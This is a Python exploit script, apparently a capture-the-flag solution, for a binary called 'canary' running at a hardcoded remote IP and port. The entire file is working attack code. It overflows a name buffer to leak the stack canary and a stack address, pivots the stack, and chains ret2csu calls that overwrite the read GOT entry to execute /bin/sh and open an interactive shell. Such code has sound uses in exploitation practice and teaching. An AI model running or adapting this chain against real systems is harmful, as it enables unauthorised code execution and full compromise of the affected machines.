#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./canary')
host = args.HOST or '35.202.65.196'
port = int(args.PORT or 1337)

gdbscript = '''
tbreak main
b *vuln+174

continue
'''.format(**locals())
libc=SetupLibcELF()
io = start()

# re()
sa(b"Enter your name: ",b"y"*(0x48+1))
reu(b"y"*(0x48+1))
canary = uu64(b"\x00" + ren(7))
stack_leak = uu64(ren(6))
info(f"CANARY := {hex(canary)}")
info(f"STACK := {hex(stack_leak)}")

payload = flat([

	# exe.sym.main,
	0x404180-8,
	pop("rdi", 0),
	pop("rsi", 0x404180),
	exe.sym.read,
	gadget("leave; ret")

])
print(len(payload))
re(timeout=2)
s( payload.ljust(0x49, b'y') + p(canary) + p(stack_leak-0x71))
# re(timeout=2)
# sleep(2)
binsh=0x4042e8
sla(b"Enter your name again: Thank you\n", ret2csu(what=exe.got.read, rdi=0, rsi=exe.got.read, rdx=1) + ret2csu(what=exe.got.read, rdi=1, rsi=exe.got.read, rdx=0x3b) + ret2csu(what=exe.got.read, rdi=binsh, rsi=0, rdx=0) + b"/bin/sh\x00" )
pause()
sl(b"\x2f")
# [+] 0x438d0 -> 0xe534f = 0xa1a7f

io.interactive()
